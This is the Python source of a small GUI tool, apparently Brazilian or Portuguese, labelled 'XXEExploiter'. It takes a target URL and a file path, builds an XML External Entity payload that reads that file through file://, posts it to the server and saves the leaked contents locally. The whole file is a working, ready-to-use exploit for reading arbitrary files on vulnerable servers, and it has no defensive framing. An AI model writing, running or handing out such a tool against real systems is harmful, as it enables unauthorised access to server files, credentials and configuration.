import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
import os
import time
from urllib.parse import urlparse
import logging

# Configuração de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class XXEExploiterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("XXEExploiter")
        self.root.geometry("600x400")

        # Estilo para o tema escuro
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TFrame', background='#2e2e2e')
        self.style.configure('TLabel', background='#2e2e2e', foreground='white')
        self.style.configure('TButton', background='#4a4a4a', foreground='white')
        self.style.configure('TEntry', fieldbackground='#4a4a4a', foreground='white', insertcolor='white')
        self.style.configure('TText', background='#4a4a4a', foreground='white', insertcolor='white')

        # Variáveis
        self.target_url = tk.StringVar()
        self.arquivo_xml = tk.StringVar()
        self.arquivo_alvo = tk.StringVar()
        self.arquivo_saida = tk.StringVar()

        self.create_widgets()

    def create_widgets(self):
        # Frame principal
        main_frame = ttk.Frame(self.root, padding="20")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Banner
        self.banner_label = ttk.Label(main_frame, text="XXEExploiter by themi.s.s", font=("Arial", 14))
        self.banner_label.pack(pady=(0, 20))

        # Campos de entrada
        ttk.Label(main_frame, text="Target URL:").pack(pady=(5, 0), anchor=tk.W)
        target_entry = ttk.Entry(main_frame, textvariable=self.target_url, width=50)
        target_entry.pack(pady=(0, 10), fill=tk.X)

        ttk.Label(main_frame, text="Arquivo XML:").pack(pady=(5, 0), anchor=tk.W)
        arquivo_entry = ttk.Entry(main_frame, textvariable=self.arquivo_xml, width=50)
        arquivo_entry.pack(pady=(0, 10), fill=tk.X)

        ttk.Label(main_frame, text="Arquivo Alvo:").pack(pady=(5, 0), anchor=tk.W)
        alvo_entry = ttk.Entry(main_frame, textvariable=self.arquivo_alvo, width=50)
        alvo_entry.pack(pady=(0, 10), fill=tk.X)

        ttk.Label(main_frame, text="Arquivo de Saída:").pack(pady=(5, 0), anchor=tk.W)
        saida_entry = ttk.Entry(main_frame, textvariable=self.arquivo_saida, width=50)
        saida_entry.pack(pady=(0, 10), fill=tk.X)

        # Botão de executar
        executar_button = ttk.Button(main_frame, text="Executar", command=self.executar_xxe)
        executar_button.pack(pady=20)

        # Área de texto para exibir a resposta
        ttk.Label(main_frame, text="Resposta do Servidor:").pack(pady=(10, 0), anchor=tk.W)
        self.resposta_text = tk.Text(main_frame, height=10, width=60, wrap=tk.WORD)
        self.resposta_text.pack(pady=(0, 10), fill=tk.BOTH, expand=True)

    def verificar_url(self, url):
        parsed_url = urlparse(url)
        if not parsed_url.scheme:
            messagebox.showerror("Erro", "URL inválida! Use http:// ou https://")
            return False
        return True

    def enviar_payload_xxe(self, target, arquivo, payload):
        try:
            headers = {'Content-Type': 'application/xml'}
            response = requests.post(
                target,
                data=payload,
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                logging.info("Payload enviado com sucesso!")
                return response.text
            else:
                logging.error(f"Erro: {response.status_code}")
                messagebox.showerror("Erro", f"Erro: {response.status_code}")
                return None
        except requests.exceptions.RequestException as e:
            logging.error(f"Erro de requisição: {e}")
            messagebox.showerror("Erro", f"Erro de requisição: {e}")
            return None
        except Exception as e:
            logging.error(f"Erro inesperado: {e}")
            messagebox.showerror("Erro", f"Erro inesperado: {e}")
            return None

    def executar_xxe(self):
        target = self.target_url.get()
        arquivo = self.arquivo_xml.get()
        arquivo_alvo = self.arquivo_alvo.get()
        arquivo_saida = self.arquivo_saida.get()

        if not self.verificar_url(target):
            return

        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{arquivo_alvo}">
]>
<root>
  <name>&xxe;</name>
</root>"""

        response_text = self.enviar_payload_xxe(target, arquivo, payload)

        if response_text:
            self.resposta_text.delete("1.0", tk.END)
            self.resposta_text.insert(tk.END, response_text)

            try:
                with open(arquivo_saida, "w") as f:
                    f.write(response_text)
                logging.info(f"Conteúdo de {arquivo_alvo} salvo em {arquivo_saida}")
                messagebox.showinfo("Sucesso", f"Conteúdo de {arquivo_alvo} salvo em {arquivo_saida}")
            except Exception as e:
                logging.error(f"Erro ao salvar o arquivo: {e}")
                messagebox.showerror("Erro", f"Erro ao salvar o arquivo: {e}")
        else:
            logging.error("Falha ao obter a resposta do servidor.")
            messagebox.showerror("Erro", "Falha ao obter a resposta do servidor.")

if __name__ == "__main__":
    root = tk.Tk()
    gui = XXEExploiterGUI(root)
    root.mainloop()
